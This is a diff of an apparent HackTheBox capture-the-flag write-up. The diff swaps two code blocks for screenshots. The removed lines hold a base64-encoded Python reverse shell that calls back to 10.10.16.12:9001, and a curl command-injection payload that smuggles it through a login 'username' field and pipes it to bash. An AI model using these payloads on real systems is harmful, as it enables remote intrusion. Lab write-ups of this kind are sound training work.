@@ -80,9 +80,8 @@ We will make a python reverse shell payload by: <https://www.revshells.com/>
 
 
 Encode it by: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
-```
-cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjEyIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=
-```
+
+![](/assets/img/posts/2-rev-python.png)
 
 Then using the first part of the payload:
 ```
@@ -90,9 +89,9 @@ curl http://10.10.11.224:55555/htb\login -d username=;`echo <payload> |base64 -d
 ```
 
 So the final payload will be
-```
-curl http://10.10.11.224:55555/htb/login -d username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjEyIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=|base64 -d|bash`
-```
+
+![](/assets/img/posts/3-rev-python.png)
+
 
 Back to our listener, we will got a shell
 
